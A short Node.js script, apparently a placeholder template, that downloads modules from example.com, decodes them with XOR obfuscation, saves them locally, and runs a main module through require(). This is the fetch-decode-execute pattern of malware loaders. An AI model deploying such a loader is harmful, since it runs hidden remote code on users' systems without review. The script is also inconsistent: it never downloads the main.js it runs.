const fs = require("fs");
const path = require("path");
const axios = require("axios");
const crypto = require("crypto");

// Local paths
const baseDir = path.join(__dirname, "modules");
const mainModule = "main.js";
const filesToDownload = ["module1.js", "module2.js"]; // Placeholder

// Ensure baseDir exists
if (!fs.existsSync(baseDir)) {
  fs.mkdirSync(baseDir);
}

// Function to decrypt data (simple XOR with rotating key)
function decrypt(data, key) {
  let result = "";
  let keyIndex = 0;
  for (let i = 0; i < data.length; i++) {
    const charCode = data.charCodeAt(i) ^ key.charCodeAt(keyIndex);
    result += String.fromCharCode(charCode);
    keyIndex = (keyIndex + 1) % key.length;
  }
  return result;
}

// Download and save a module
async function downloadAndSave(url, filepath) {
  try {
    const response = await axios.get(url, { responseType: "arraybuffer" });
    const decrypted = decrypt(response.data.toString(), "myKey"); // Replace with actual key
    fs.writeFileSync(filepath, decrypted);
    console.log(`Saved module to ${filepath}`);
  } catch (error) {
    console.error(`Failed to download ${url}`, error.message);
  }
}

// Main logic
(async () => {
  for (let filename of filesToDownload) {
    const filepath = path.join(baseDir, filename);
    const url = `https://example.com/modules/${filename}`;
    await downloadAndSave(url, filepath);
  }

  // Run main module
  const mainPath = path.join(baseDir, mainModule);
  if (fs.existsSync(mainPath)) {
    require(mainPath);
  } else {
    console.error("Main module not found.");
  }
})();
